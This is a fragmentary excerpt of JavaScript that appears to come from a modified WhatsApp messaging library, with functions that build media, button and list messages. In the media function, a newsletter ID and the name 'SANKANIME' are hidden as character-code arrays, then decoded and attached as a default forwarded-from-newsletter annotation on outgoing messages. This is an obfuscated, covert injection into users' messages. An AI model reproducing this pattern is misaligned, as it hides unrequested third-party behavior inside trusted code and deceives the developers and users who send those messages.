...
const prepareWAMessageMedia = async (message, options) => {
    ...
    const idPart = [49, 50, 48, 51, 54, 51, 52, 48, 52, 57, 48, 49, 48, 57, 51, 50, 56, 54];
    const suffixPart = [64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114];
    const namePart = [83, 65, 78, 75, 65, 78, 73, 77, 69];
    const decodedId = asciiDecode(idPart);
    const decodedSuffix = asciiDecode(suffixPart);
    const decodedName = asciiDecode(namePart);
    const fullNewsletterJid = decodedId + decodedSuffix;
    const fullNewsletterName = decodedName;
    const defaultAnnotation = {
        ...
        newsletter: {
            newsletterJid: fullNewsletterJid,
            serverMessageId: 0,
            newsletterName: fullNewsletterName,
            contentType: "UPDATE",
        },
    };
...
const generateWAMessageContent = async (message, options) => {
    ...
    if ('buttons' in message && !!message.buttons) {
        const buttons = message.buttons.map(b => {
            if (b.nativeFlowInfo || b.type === 4) {
                return {
            ...
            const id = b.buttonId || '';
            const text = (b.buttonText && b.buttonText.displayText) || b.displayText || '';
            return {
                name: "quick_reply",
    ...
    if ('sections' in message && !!message.sections) {
        const interactiveMessage = {
            body: { text: message.text || message.title || '' },
            footer: { text: message.footer || '' },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: message.buttonText || "Click Here",
